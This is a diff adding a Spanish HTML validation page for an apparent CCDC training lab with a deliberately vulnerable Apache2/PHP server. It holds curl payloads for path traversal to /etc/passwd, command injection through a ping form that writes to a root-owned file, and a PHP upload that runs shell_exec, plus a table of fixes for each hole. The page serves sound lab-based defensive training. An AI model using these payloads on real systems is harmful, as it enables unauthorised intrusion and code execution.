@@ -1,0 +1,277 @@
+<!doctype html>
+<html lang="es" data-doc-page="validacion-apache.html">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Guía de validación del laboratorio Apache2: permisos, lectura de archivos, inyección de comandos y subida de PHP.">
+  <meta name="color-scheme" content="dark">
+  <title>CCDC · Validación Apache2</title>
+  <style>
+    :root { --ink: #17283d; --muted: #536579; --accent: #b43d20; --paper: #f3f5f8; --line: #dce3ec; --sidebar: #132136; }
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; scroll-padding-top: 28px; }
+    body { margin: 0; color: var(--ink); background: var(--paper); font: 16px/1.75 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+    a { color: var(--accent); text-underline-offset: 4px; }
+    a:hover { color: #762612; }
+    button, summary, a { -webkit-tap-highlight-color: transparent; }
+    :focus-visible { outline: 3px solid #e89c52; outline-offset: 4px; }
+    .skip-link { position: fixed; top: 12px; left: 12px; z-index: 10; transform: translateY(-180%); background: white; padding: 8px 16px; border-radius: 6px; }
+    .skip-link:focus { transform: translateY(0); }
+    .layout { display: grid; grid-template-columns: 282px minmax(0, 1fr); min-height: 100vh; }
+    .sidebar { position: sticky; top: 0; height: 100vh; display: flex; flex-direction: column; gap: 26px; padding: 32px 22px 24px; background: var(--sidebar); color: #d3deed; }
+    .brand { display: flex; align-items: center; gap: 12px; padding: 0 8px; text-decoration: none; color: white; }
+    .brand:hover { color: white; }
+    .brand-mark { display: grid; place-items: center; flex: 0 0 42px; height: 42px; color: #fff; background: #c94c2c; border-radius: 10px; font: 700 20px ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .brand strong { display: block; font-size: 20px; line-height: 1.25; letter-spacing: .06em; }
+    .brand small { display: block; color: #a8bad1; font-size: 12px; line-height: 1.6; }
+    .mail-shortcut { margin: 0 6px; padding: 11px 14px; border: 1px solid #536174; border-radius: 8px; text-decoration: none; color: #fff; font-size: 14px; font-weight: 600; display: flex; justify-content: space-between; }
+    .mail-shortcut:hover { background: #233850; color: white; border-color: #8294ab; }
+    .toc { min-height: 0; flex: 1; overflow-y: auto; scrollbar-width: thin; scrollbar-color: #55647a transparent; }
+    .toc summary { color: #a8bad1; font-size: 11px; font-weight: 700; letter-spacing: .12em; text-transform: uppercase; cursor: pointer; margin: 0 8px 14px; }
+    .nav-link { display: flex; gap: 11px; align-items: baseline; padding: 8px 10px; border-radius: 7px; margin-bottom: 3px; color: #cad5e5; text-decoration: none; font-size: 13px; line-height: 1.5; }
+    .nav-link:hover, .nav-link.is-active { background: #25374d; color: #fff; }
+    .nav-link.is-active { box-shadow: inset 3px 0 #ee8c61; }
+    .nav-number { flex: 0 0 18px; color: #9cb1ca; font: 11px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .nav-link.level-3 { padding-left: 37px; color: #b7c8de; font-size: 12px; }
+    .nav-dot { width: 4px; height: 4px; background: #9cb1ca; flex: 0 0 4px; border-radius: 50%; align-self: center; }
+    .sidebar-footer { padding: 16px 8px 0; border-top: 1px solid #34445b; font-size: 12px; color: #a8bad1; }
+    .sidebar-footer a { display: inline-block; color: #e0e8f3; }
+    main { min-width: 0; width: 100%; max-width: 1240px; margin: 0 auto; padding: 52px clamp(24px, 4vw, 72px) 36px; }
+    .eyebrow { font-size: 11px; font-weight: 750; letter-spacing: .15em; text-transform: uppercase; color: var(--accent); margin-bottom: 18px; }
+    .hero { margin-bottom: 32px; }
+    h1 { max-width: 820px; font-size: clamp(34px, 3.5vw, 52px); letter-spacing: -.045em; line-height: 1.1; margin: 0 0 24px; font-weight: 750; }
+    h1 + p { font-size: 18px; color: var(--muted); max-width: 78ch; }
+    h2, h3 { letter-spacing: -.025em; scroll-margin-top: 28px; }
+    h2 { font-size: 26px; line-height: 1.25; font-weight: 720; margin: 0; }
+    h3 { font-size: 22px; line-height: 1.4; margin: 38px 0 18px; padding-top: 26px; border-top: 1px solid var(--line); }
+    p { margin: 0 0 18px; }
+    p:last-child { margin-bottom: 0; }
+    .hero-links { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 26px; }
+    .hero-links a { text-decoration: none; padding: 10px 16px; font-size: 14px; font-weight: 650; border-radius: 7px; background: white; color: var(--ink); border: 1px solid #c7d2df; }
+    .hero-links a:first-child { background: var(--ink); color: white; border-color: var(--ink); }
+    .hero-links a:hover { border-color: var(--accent); }
+    .caution { border-left: 3px solid #c87132; background: #fff4e8; color: #6d401f; padding: 18px 22px; border-radius: 0 8px 8px 0; margin-top: 26px; font-size: 14px; }
+    .caution-title { display: block; margin-bottom: 5px; font-size: 14px; color: #6c3615; }
+    .caution p { margin: 0; }
+    .doc-section { background: #fff; border: 1px solid var(--line); border-radius: 12px; padding: 30px 32px 32px; margin-bottom: 24px; min-width: 0; }
+    .section-heading { display: flex; align-items: center; gap: 14px; margin-bottom: 26px; }
+    .section-number { display: grid; place-items: center; flex: 0 0 34px; height: 34px; border: 1px solid #dce3ec; border-radius: 8px; color: #687d93; font: 12px ui-monospace, SFMono-Regular, Menlo, monospace; }
+    ul, ol { padding-left: 24px; margin: 18px 0 22px; }
+    li { padding-left: 5px; margin: 7px 0; }
+    li::marker { color: #7b4b31; font-weight: 600; }
+    code { font: .88em/1.6 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; overflow-wrap: anywhere; }
+    :not(pre) > code { padding: 2px 5px; border-radius: 4px; background: #edf1f6; color: #283d55; }
+    .code-block { overflow: hidden; border-radius: 9px; background: #132136; margin: 20px 0 24px; }
+    .code-toolbar { display: flex; align-items: center; justify-content: space-between; background: #1d2d43; padding: 8px 16px; border-bottom: 1px solid #334257; color: #bccbdd; font: 11px/1.6 ui-monospace, SFMono-Regular, Menlo, monospace; text-transform: uppercase; letter-spacing: .06em; }
+    .copy-button { padding: 3px 10px; min-height: 28px; border: 1px solid #6c7d91; border-radius: 5px; background: transparent; color: #e0e8f3; cursor: pointer; font: 12px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+    .copy-button:hover { background: #34475f; }
+    pre { margin: 0; padding: 20px; overflow-x: auto; scrollbar-width: thin; color: #e3ebf5; font-size: 13px; line-height: 1.8; tab-size: 4; }
+    pre code { font-size: inherit; overflow-wrap: normal; }
+    .table-scroll { overflow-x: auto; margin: 20px 0 24px; border: 1px solid var(--line); border-radius: 8px; scrollbar-width: thin; }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; line-height: 1.65; }
+    th { padding: 12px 14px; text-align: left; font-size: 11px; text-transform: uppercase; letter-spacing: .045em; color: #465971; background: #eef2f7; white-space: nowrap; }
+    td { padding: 13px 14px; vertical-align: top; border-top: 1px solid #e2e8f0; }
+    td:first-child { font-weight: 500; }
+    tbody tr:nth-child(even) { background: #fafbfd; }
+    table code { white-space: nowrap; }
+    .page-footer { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 16px; padding: 8px 2px; color: var(--muted); font-size: 13px; }
+    .page-footer a { color: var(--muted); }
+    .copy-status { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0, 0, 0, 0); white-space: nowrap; border: 0; }
+    @media (max-width: 1020px) {
+      .layout { grid-template-columns: 240px minmax(0, 1fr); }
+      .sidebar { padding: 26px 14px 20px; }
+      main { padding: 36px 24px; }
+      .doc-section { padding: 25px 24px; }
+      h2 { font-size: 23px; }
+    }
+    @media (max-width: 760px) {
+      .layout { display: block; }
+      .sidebar { position: static; height: auto; padding: 20px; gap: 18px; }
+      .brand { padding: 0; }
+      .mail-shortcut { margin: 0; }
+      .toc { overflow: visible; flex: none; }
+      .toc summary { margin: 0; padding: 4px 0; }
+      .toc[open] summary { margin-bottom: 12px; }
+      .toc nav { max-height: 52vh; overflow-y: auto; margin-top: 4px; }
+      .sidebar-footer { display: none; }
+      main { padding: 30px 16px 24px; }
+      .eyebrow { margin-bottom: 12px; }
+      h1 { font-size: 36px; }
+      h1 + p { font-size: 16px; }
+      .doc-section { padding: 24px 18px; }
+      .section-heading { gap: 10px; align-items: flex-start; }
+      h2 { font-size: 22px; }
+      h3 { font-size: 20px; }
+      .caution { padding: 16px; }
+      .hero-links a { flex: 1 1 180px; text-align: center; }
+      pre { padding: 16px; font-size: 12px; }
+      table { min-width: 600px; }
+    }
+    @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+    @media print {
+      body { background: white; font-size: 11pt; color: #111; }
+      .layout { display: block; }
+      .sidebar, .skip-link, .hero-links, .copy-button { display: none; }
+      main { padding: 0; max-width: none; }
+      .doc-section { border: 0; padding: 20px 0; }
+      .section-heading, h3 { break-after: avoid; }
+      .code-block, table tr { break-inside: avoid; }
+      .code-block, .code-toolbar { background: #f3f3f3; color: #111; }
+      pre { color: #111; white-space: pre-wrap; }
+      pre code { overflow-wrap: anywhere; }
+      .table-scroll { overflow: visible; }
+      table { min-width: 0; }
+      a { color: inherit; }
+    }
+  
+    .page-tabs { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 28px; padding-bottom: 12px; border-bottom: 1px solid var(--line); }
+    .page-tabs a { padding: 9px 16px; border: 1px solid #c7d2df; border-radius: 7px; text-decoration: none; background: white; color: var(--ink); font-size: 14px; font-weight: 650; }
+    .page-tabs a[aria-current="page"] { background: var(--ink); border-color: var(--ink); color: white; }
+    @media print { .page-tabs { display: none; } }
+</style>
+  <link rel="stylesheet" href="docs-theme.css">
+</head>
+<body>
+  <a class="skip-link" href="#contenido">Saltar al contenido</a>
+  <div class="layout">
+    <aside class="sidebar" aria-label="Navegación de validación">
+      <a class="brand" href="ccdc_php.html"><span class="brand-mark" aria-hidden="true">&gt;_</span><span><strong>CCDC</strong><small>Red Team · Guía de prácticas</small></span></a>
+      <a class="mail-shortcut" href="ccdc_php.html">Volver a la guía <span aria-hidden="true">↗</span></a>
+      <details class="toc" open><summary>En esta guía · 4 secciones</summary><nav aria-label="Secciones de validación"><a class="nav-link" href="#preparacion"><span class="nav-number" aria-hidden="true">00</span><span>Preparar la variable del servidor</span></a><a class="nav-link" href="#permisos-locales"><span class="nav-number" aria-hidden="true">01</span><span>Verificar los permisos en el servidor</span></a><a class="nav-link" href="#pruebas-red"><span class="nav-number" aria-hidden="true">02</span><span>Pruebas de explotación por red</span></a><a class="nav-link" href="#matriz-evaluacion"><span class="nav-number" aria-hidden="true">03</span><span>Matriz de evaluación</span></a></nav></details>
+      <div class="sidebar-footer">Documento de referencia<br><a href="../instservices">Ver instservices ↗</a></div>
+    </aside>
+    <main id="contenido" tabindex="-1">
+      <div class="language-switch" role="group" aria-label="Idioma / Language"><button type="button" data-language="es" lang="es" aria-pressed="true">Español</button><button type="button" data-language="en" lang="en" aria-pressed="false">English</button></div>
+      <nav class="page-tabs" aria-label="Páginas de documentación"><a href="ccdc_php.html">Guía del laboratorio</a><a href="validacion-apache.html" aria-current="page">Validación Apache2</a><a href="../fixphp.html">fixphp</a></nav>
+      <div class="hero" id="inicio"><div class="eyebrow">Validación / Laboratorio CCDC</div><h1>Validación de Apache2 y PHP</h1><p>Comandos de prueba y criterios de evaluación para comprobar el estado del servidor antes y después de las correcciones del Blue Team.</p><p>Ejecuta estas pruebas en la VM aislada del laboratorio autorizado.</p></div>
+      <section class="doc-section" aria-labelledby="preparacion"><header class="section-heading"><span class="section-number" aria-hidden="true">00</span><h2 id="preparacion">Preparar la variable del servidor</h2></header>
+<p>Define la variable <code>$ipphpserver</code> en la terminal de tu máquina atacante o de administración para ejecutar las pruebas de validación contra tu servidor Apache2:</p><div class="code-block"><div class="code-toolbar"><span>bash</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash">export ipphpserver=&quot;192.168.1.100&quot;  # Reemplaza con la IP real de tu servidor
+</code></pre></div><aside class="caution"><strong class="caution-title">Disponibilidad de los escenarios</strong><p>El <code>instservices</code> actual crea <code>/var/www/html/ccdc-lab.php</code> y <code>/var/www/html/uploads/team-notes.txt</code>, asigna <code>666</code> a esos archivos y <code>777</code> a las carpetas web. Los archivos <code>download.php</code>, <code>path-traversal.php</code>, <code>visor.php</code>, <code>ping_tool.php</code>, <code>basic-collection.php</code>, <code>upload.php</code> e <code>insecure-file-upload.php</code> requieren instalación adicional. Un <code>404</code> indica una ruta ausente y no demuestra que la vulnerabilidad esté corregida.</p></aside>
+<h3>Selecciona los nombres de tu instalación</h3><p>Para la versión con visor.php y upload.php que ya respondió correctamente, usa estas variables en la misma terminal que las pruebas:</p><div class="code-block"><div class="code-toolbar"><span>bash / zsh</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash">ping_page=ping_tool.php
+viewer_page=visor.php
+upload_page=upload.php
+upload_field=avatar
+</code></pre></div><p>Si instalaste el script original instalador_de_laboratorio_php_vulnerable.sh de este repositorio, usa este bloque en su lugar. También cambia el campo de subida: archivo, no avatar.</p><div class="code-block"><div class="code-toolbar"><span>bash / zsh</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash">ping_page=ping-tool.php
+viewer_page=visor-logs.php
+upload_page=subir-archivo.php
+upload_field=archivo
+</code></pre></div><p>Comprueba las tres rutas antes de las pruebas. Un 200 confirma que la página responde, pero no demuestra una vulnerabilidad; revisa también el contenido. Un 404 indica una ruta ausente.</p><div class="code-block"><div class="code-toolbar"><span>bash / zsh</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash">for page in &quot;$ping_page&quot; &quot;$viewer_page&quot; &quot;$upload_page&quot;; do
+    curl -sS -o /dev/null -w &quot;%{http_code} %{url_effective}\n&quot; &quot;http://$ipphpserver/$page&quot;
+done
+</code></pre></div><aside class="caution"><strong class="caution-title">Instalación incompleta y set -e</strong><p>El instalador original clona repositorios y copia archivos antes de crear las tres páginas locales. Con set -e, un fallo de git clone o una ruta de cp que ya no existe detiene el script antes de generarlas. Revisa el primer error de la instalación y confirma los archivos presentes en /var/www/html/. No interpretes ese fallo como una corrección de seguridad ni elimines set -e para ocultarlo.</p></aside>
+</section><section class="doc-section" aria-labelledby="permisos-locales"><header class="section-heading"><span class="section-number" aria-hidden="true">01</span><h2 id="permisos-locales">Verificar los permisos en el servidor</h2></header>
+<p>Antes de lanzar las pruebas por red, comprueba <strong>en el servidor Apache2</strong> el propietario y los permisos de los archivos instalados en <code>/var/www/html/</code>:</p><div class="code-block"><div class="code-toolbar"><span>bash</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash">ls -la /var/www/html/*.php /var/www/html/uploads/
+ls -ld /var/www/html /var/www/html/uploads
+</code></pre></div><p>Si preparaste el escenario con propietario <code>root:root</code> y permisos <code>777</code>, observarás <code>-rwxrwxrwx 1 root root</code> en los archivos. Aunque el dueño sea <code>root</code>, el último bloque <code>rwx</code> permite que <code>www-data</code> sobrescriba el código. En el escenario actual con <code>666</code>, aparecerá <code>-rw-rw-rw-</code>: también permite la escritura por otros usuarios. PHP no necesita el bit de ejecución del archivo para interpretarlo.</p><p>Los permisos <code>777</code> en las carpetas permiten además crear o reemplazar archivos dentro de ellas.</p>
+</section><section class="doc-section" aria-labelledby="pruebas-red"><header class="section-heading"><span class="section-number" aria-hidden="true">02</span><h2 id="pruebas-red">Pruebas de explotación por red</h2></header>
+<h3 id="lectura-archivos">A. Directory Traversal / LFI</h3>
+<p>Las pruebas de <code>download.php</code> (del laboratorio <code>web-app-security-lab</code>), <code>path-traversal.php</code> (<code>vulnerable-php-code-examples</code>) y la plantilla <code>visor.php</code> comprueban si se pueden leer archivos fuera de la carpeta permitida. Confirma primero que están instalados y qué parámetros reciben.</p><div class="code-block"><div class="code-toolbar"><span>bash</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash"># 1. Explotar download.php para leer /etc/passwd
+curl -sS &quot;http://$ipphpserver/download.php?file=../../../../etc/passwd&quot;
+
+# 2. Explotar visor.php (si incluiste la plantilla del laboratorio)
+curl -sS &quot;http://$ipphpserver/$viewer_page?archivo=../../../../etc/passwd&quot;
+
+# 3. Verificar qué variable GET/POST usa path-traversal.php y probarla
+curl -sS &quot;http://$ipphpserver/path-traversal.php?file=../../../../etc/passwd&quot;
+</code></pre></div><p><strong>Resultado vulnerable:</strong> la terminal devuelve el contenido de <code>/etc/passwd</code>, por ejemplo <code>root:x:0:0:root:/root:/bin/bash</code>.</p>
+<p>Interpretación de la salida: si visor.php devuelve root:x:0:0:root:/root:/bin/bash, la lectura fuera de la carpeta permitida ya funcionó. Si uploads/payload.php devuelve uid=33(www-data), la subida y la ejecución de PHP también funcionaron.</p>
+<h3 id="inyeccion-comandos">B. Command Injection y abuso de permisos</h3>
+<p>Con <code>$ping_page</code> instalado, esta prueba verifica que PHP permite inyectar comandos del sistema y que <code>www-data</code> puede alterar archivos de <code>root</code> con escritura habilitada para otros usuarios. El segundo comando añade un comentario al archivo del laboratorio.</p><div class="code-block"><div class="code-toolbar"><span>bash</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash"># 1. Ver el usuario que corre Apache (www-data) y los permisos
+curl -sS -X POST &quot;http://$ipphpserver/$ping_page&quot; \
+  --data-urlencode &#x27;ip=127.0.0.1; id; ls -l /var/www/html/ccdc-lab.php&#x27;
+
+# 2. Modificar un archivo propiedad de root desde la web
+curl -sS -X POST &quot;http://$ipphpserver/$ping_page&quot; \
+  --data-urlencode &#x27;ip=127.0.0.1; echo &quot;&lt;!-- CCDC: prueba de escritura --&gt;&quot; &gt;&gt; /var/www/html/ccdc-lab.php&#x27;
+
+# 3. Comprobar que ccdc-lab.php fue alterado exitosamente
+curl -sS &quot;http://$ipphpserver/ccdc-lab.php&quot; | tail -n 5
+</code></pre></div><aside class="caution"><strong class="caution-title">Zsh: event not found</strong><p>Ese error ocurre en tu terminal antes de ejecutar curl: Zsh interpreta el signo ! del comentario HTML como expansión del historial cuando el argumento está entre comillas dobles. El comando corregido encierra todo el dato POST entre comillas simples y usa --data-urlencode. No necesitas desactivar el historial. La URL conserva comillas dobles para expandir las variables.</p><p>La prueba de escritura requiere que instservices haya creado ccdc-lab.php. Si falta ese archivo, no uses la prueba de escritura para evaluar sus permisos.</p></aside><p><strong>Tip para <code>basic-collection.php</code>:</strong> si utilizas esta colección de ejemplos de XSS, SQLi e inyección de comandos, consulta en el servidor los nombres exactos de los parámetros <code>$_GET</code>, <code>$_POST</code> o <code>$_REQUEST</code> antes de probarlos:</p><div class="code-block"><div class="code-toolbar"><span>bash</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash">grep -nE &#x27;\$_(GET|POST|REQUEST)&#x27; /var/www/html/basic-collection.php
+</code></pre></div><h3 id="subida-php">C. Subida de PHP en /uploads/</h3>
+<p>Con <code>$upload_page</code> instalado, comprueba si un usuario puede subir un script <code>.php</code> a <code>/var/www/html/uploads/</code> y ejecutarlo por HTTP. Este archivo de prueba ejecuta únicamente <code>id</code>. Ajusta la ruta del formulario y el campo <code>$upload_field</code> si tu plantilla usa otros nombres.</p><div class="code-block"><div class="code-toolbar"><span>bash</span><button class="copy-button" type="button" aria-label="Copiar comandos">Copiar</button></div><pre><code class="language-bash"># 1. Crear un script PHP de prueba local
+echo &#x27;&lt;?php echo &quot;Ejecutando como: &quot; . shell_exec(&quot;id&quot;); ?&gt;&#x27; &gt; payload.php
+
+# 2. Subirlo al servidor vulnerable
+curl -sS -F &quot;${upload_field}=@payload.php&quot; &quot;http://$ipphpserver/$upload_page&quot;
+
+# 3. Ejecutar el archivo subido en /uploads/
+curl -sS &quot;http://$ipphpserver/uploads/payload.php&quot;
+</code></pre></div><p><strong>Resultado vulnerable:</strong> el servidor responde <code>Ejecutando como: uid=33(www-data) gid=33(www-data)...</code>.</p>
+</section><section class="doc-section" aria-labelledby="matriz-evaluacion"><header class="section-heading"><span class="section-number" aria-hidden="true">03</span><h2 id="matriz-evaluacion">Matriz de evaluación</h2></header>
+<p>Cuando los jugadores terminen de corregir PHP y ajustar los permisos de Apache2, vuelve a ejecutar las pruebas y compara los resultados. Verifica también que las funciones legítimas sigan disponibles.</p>
+<div class="table-scroll" tabindex="0" role="region" aria-label="Matriz de evaluación de Apache2"><table><thead><tr><th scope="col">Vector probado</th><th scope="col">Respuesta vulnerable</th><th scope="col">Tras la corrección</th></tr></thead><tbody>
+<tr><td>Permisos en <code>/var/www/html/</code></td><td><code>www-data</code> puede sobrescribir PHP de <code>root</code> con permisos <code>777</code> o <code>666</code>.</td><td>Archivos de código con <code>644</code> y carpetas de código con <code>755</code>, propietario <code>root:root</code>. Apache no puede modificar el código. Si la aplicación necesita subir archivos, limita la escritura al directorio destinado a esas subidas.</td></tr>
+<tr><td>Inyección de comandos (<code>; id</code>)</td><td>Devuelve <code>uid=33(www-data)</code> debajo del ping.</td><td>Un ping a una IP válida permitida funciona; <code>; id</code> se rechaza como IP inválida y no ejecuta <code>id</code>.</td></tr>
+<tr><td>Path Traversal</td><td>Imprime los usuarios de <code>/etc/passwd</code>.</td><td>Solo permite archivos autorizados dentro de la carpeta prevista. Si usa <code>realpath()</code>, comprueba que la ruta resuelta permanezca dentro de esa carpeta; llamar a <code>basename()</code> o <code>realpath()</code> por sí solo no demuestra una corrección completa.</td></tr>
+<tr><td>Ejecución en <code>/uploads/</code></td><td><code>/uploads/payload.php</code> ejecuta PHP.</td><td>El formulario rechaza archivos PHP y Apache impide ejecutar scripts en las subidas. Un archivo PHP de prueba ya presente debe quedar bloqueado, por ejemplo con <code>403 Forbidden</code>. Servir código fuente como texto plano evita su ejecución, pero no se considera una corrección completa.</td></tr>
+</tbody></table></div>
+</section>
+      <footer class="page-footer"><a href="ccdc_php.html">← Guía del laboratorio</a><a href="#inicio">Volver al inicio ↑</a></footer>
+    </main>
+  </div>
+  <p class="copy-status" role="status" aria-live="polite"></p>
+  <script>
+    const toc = document.querySelector('.toc');
+    const mobile = window.matchMedia('(max-width: 760px)');
+    const syncNavigation = () => { toc.open = !mobile.matches; };
+    syncNavigation();
+    mobile.addEventListener('change', syncNavigation);
+    document.querySelectorAll('.toc a').forEach(link => link.addEventListener('click', () => {
+      if (mobile.matches) toc.open = false;
+    }));
+
+    const links = Array.from(document.querySelectorAll('.nav-link'));
+    const targets = links.map(link => document.getElementById(link.hash.slice(1)));
+    let scheduled = false;
+    function updateActiveSection() {
+      let active = -1;
+      targets.forEach((target, index) => { if (target.getBoundingClientRect().top <= 160) active = index; });
+      links.forEach((link, index) => {
+        link.classList.toggle('is-active', index === active);
+        if (index === active) link.setAttribute('aria-current', 'location');
+        else link.removeAttribute('aria-current');
+      });
+      scheduled = false;
+    }
+    window.addEventListener('scroll', () => {
+      if (!scheduled) { scheduled = true; requestAnimationFrame(updateActiveSection); }
+    }, { passive: true });
+    updateActiveSection();
+
+    async function copyText(text) {
+      if (navigator.clipboard && window.isSecureContext) {
+        try { await navigator.clipboard.writeText(text); return; } catch (_) { /* Local-file fallback below. */ }
+      }
+      const textarea = document.createElement('textarea');
+      textarea.value = text;
+      textarea.style.cssText = 'position:fixed;top:0;left:-9999px';
+      document.body.appendChild(textarea);
+      textarea.select();
+      const copied = document.execCommand('copy');
+      textarea.remove();
+      if (!copied) throw new Error('Copy unavailable');
+    }
+    document.querySelectorAll('.copy-button').forEach(button => {
+      button.addEventListener('click', async () => {
+        const code = button.closest('.code-block').querySelector('pre code');
+        try {
+          await copyText(code.textContent);
+          button.textContent = window.docsText('copied');
+          document.querySelector('.copy-status').textContent = window.docsText('copySuccess');
+        } catch (_) {
+          const selection = window.getSelection();
+          const range = document.createRange();
+          range.selectNodeContents(code);
+          selection.removeAllRanges();
+          selection.addRange(range);
+          button.textContent = window.docsText('selected');
+          document.querySelector('.copy-status').textContent = window.docsText('copyFallback');
+        }
+        button.focus({ preventScroll: true });
+        setTimeout(() => { button.textContent = window.docsText('copy'); }, 2200);
+      });
+    });
+  </script>
+  <script src="docs-i18n.js"></script>
+</body>
+</html>
